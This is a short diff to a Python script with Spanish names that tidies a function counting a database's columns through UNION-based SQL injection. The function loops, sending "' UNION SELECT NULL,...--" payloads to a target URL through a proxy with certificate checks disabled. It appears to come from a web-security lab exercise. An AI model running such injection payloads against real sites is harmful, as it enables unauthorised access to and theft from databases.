@@ -21,7 +21,6 @@ def Obtener_cantidad_columnas_función(url):
     bandera = True
     while bandera:
         columna += 1 
-        #payload_obtener_cantidad_columnas = "' UNION SELECT " + "NULL," * columna + "--"
         payload_obtener_cantidad_columnas = "' UNION SELECT " + ", ".join(["NULL"] * columna) + "--"
         solicitud = requests.get(url + ruta + payload_obtener_cantidad_columnas,verify=False, proxies=proxyjp) 
         respuesta = solicitud.text
@@ -29,7 +28,6 @@ def Obtener_cantidad_columnas_función(url):
             bandera = False
             return columna
     return None
-
 
 if __name__ == "__main__":
     try:
